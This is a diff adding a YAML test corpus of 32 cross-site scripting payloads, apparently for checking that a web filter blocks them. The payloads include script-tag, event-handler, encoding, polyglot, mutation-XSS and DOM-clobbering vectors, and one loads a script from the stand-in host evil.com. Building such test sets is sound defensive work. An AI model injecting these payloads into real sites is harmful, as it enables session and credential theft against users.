@@ -1,0 +1,319 @@
+- id: xss-001
+  payload: "<script>alert(1)</script>"
+  category: xss
+  technique: script-tag
+  difficulty: basic
+  source: OWASP
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-002
+  payload: "<script src=//evil.com/x.js></script>"
+  category: xss
+  technique: script-tag
+  difficulty: basic
+  source: PayloadsAllTheThings
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-003
+  payload: "<ScRiPt>alert(1)</ScRiPt>"
+  category: xss
+  technique: case-mixing
+  difficulty: basic
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-004
+  payload: "<SCRIPT>ALERT(1)</SCRIPT>"
+  category: xss
+  technique: case-mixing
+  difficulty: basic
+  source: PayloadsAllTheThings
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-005
+  payload: "<svg onload=alert(1)>"
+  category: xss
+  technique: svg-onload
+  difficulty: basic
+  source: PortSwigger
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-006
+  payload: "<svg/onload=alert(1)>"
+  category: xss
+  technique: svg-onload
+  difficulty: intermediate
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-007
+  payload: "<img src=x onerror=alert(1)>"
+  category: xss
+  technique: img-onerror
+  difficulty: basic
+  source: OWASP
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-008
+  payload: "<img src=x onerror=alert`1`>"
+  category: xss
+  technique: img-onerror
+  difficulty: intermediate
+  source: PortSwigger
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-009
+  payload: "<img\nsrc=x\nonerror=alert(1)>"
+  category: xss
+  technique: newline-injection
+  difficulty: intermediate
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-010
+  payload: "<img\tsrc=x\tonerror=alert(1)>"
+  category: xss
+  technique: newline-injection
+  difficulty: intermediate
+  source: PayloadsAllTheThings
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-011
+  payload: "&#60;script&#62;alert(1)&#60;/script&#62;"
+  category: xss
+  technique: html-entity
+  difficulty: intermediate
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-012
+  payload: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+  category: xss
+  technique: html-entity
+  difficulty: intermediate
+  source: PayloadsAllTheThings
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-013
+  payload: "javascript:alert(1)"
+  category: xss
+  technique: javascript-protocol
+  difficulty: basic
+  source: OWASP
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-014
+  payload: "j&#x61;vascript:alert(1)"
+  category: xss
+  technique: javascript-protocol
+  difficulty: advanced
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-015
+  payload: "JaVaScRiPt:alert(1)"
+  category: xss
+  technique: javascript-protocol
+  difficulty: intermediate
+  source: PortSwigger
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-016
+  payload: "data:text/html,<script>alert(1)</script>"
+  category: xss
+  technique: data-uri
+  difficulty: intermediate
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-017
+  payload: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+  category: xss
+  technique: data-uri
+  difficulty: advanced
+  source: PayloadsAllTheThings
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-018
+  payload: "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+  category: xss
+  technique: polyglot
+  difficulty: advanced
+  source: PortSwigger
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-019
+  payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+  category: xss
+  technique: mxss
+  difficulty: advanced
+  source: PortSwigger
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-020
+  payload: "<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>"
+  category: xss
+  technique: mxss
+  difficulty: advanced
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-021
+  payload: "<img src=x onerror=alert`XSS`>"
+  category: xss
+  technique: template-literal
+  difficulty: intermediate
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-022
+  payload: "<svg><script>alert`1`</script></svg>"
+  category: xss
+  technique: template-literal
+  difficulty: intermediate
+  source: PayloadsAllTheThings
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-023
+  payload: "<body onload=alert(1)>"
+  category: xss
+  technique: event-handler
+  difficulty: basic
+  source: OWASP
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-024
+  payload: "<details open ontoggle=alert(1)>"
+  category: xss
+  technique: event-handler
+  difficulty: intermediate
+  source: PortSwigger
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-025
+  payload: "<marquee onstart=alert(1)>XSS</marquee>"
+  category: xss
+  technique: event-handler
+  difficulty: intermediate
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-026
+  payload: "<input autofocus onfocus=alert(1)>"
+  category: xss
+  technique: event-handler
+  difficulty: intermediate
+  source: PayloadsAllTheThings
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-027
+  payload: "＜script＞alert(1)＜/script＞"
+  category: xss
+  technique: unicode-fullwidth
+  difficulty: advanced
+  source: custom
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-028
+  payload: "＜svg onload=alert(1)＞"
+  category: xss
+  technique: unicode-fullwidth
+  difficulty: advanced
+  source: custom
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-029
+  payload: "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>"
+  category: xss
+  technique: base64-data
+  difficulty: advanced
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-030
+  payload: "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>"
+  category: xss
+  technique: base64-data
+  difficulty: advanced
+  source: PayloadsAllTheThings
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-031
+  payload: "<form id=x><input name=y><img name=z src=x onerror=alert(1)>"
+  category: xss
+  technique: dom-clobbering
+  difficulty: advanced
+  source: PortSwigger
+  expected: blocked
+  inject_point: query_param
+  param_name: q
+
+- id: xss-032
+  payload: "<a id=defaultView><img name=defaultView src=x onerror=alert(1)>"
+  category: xss
+  technique: dom-clobbering
+  difficulty: advanced
+  source: HackTricks
+  expected: blocked
+  inject_point: query_param
+  param_name: q
